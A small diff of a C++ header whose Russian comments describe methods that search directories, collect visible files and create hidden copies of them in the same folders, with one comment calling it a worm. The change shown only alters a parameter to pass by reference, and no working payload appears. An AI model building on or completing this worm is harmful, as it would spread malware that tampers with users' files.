@@ -67,7 +67,7 @@ public:
 	void search_list_dir();// для старта поиска по дирректориям
 	void print_list_dir();// вывод всех найденных папок, в которых будет копирование
 	void collect_visible_files(); // тот же отбор, только без параметров ( чтобы использовать без указания пути, для запуска червя )
-	void collect_visible_files(const vector<wstring> list_dir_tmp, vector<fs::path>& collected_files);// функция отбирающая только видимые файлы в определенный вектор, чтобы потом копировать все что в нем есть
+	void collect_visible_files(const vector<wstring>& list_dir_tmp, vector<fs::path>& collected_files);// функция отбирающая только видимые файлы в определенный вектор, чтобы потом копировать все что в нем есть
 	void print_file_to_copy(); // выводит все файлы которые собирается копировать
 	void replicate_files(); // вызов копирования без параметров 
 	void replicate_files(int iteration = 1);// создает скрытые копии из вектора поля file_to_copy в те же папки 
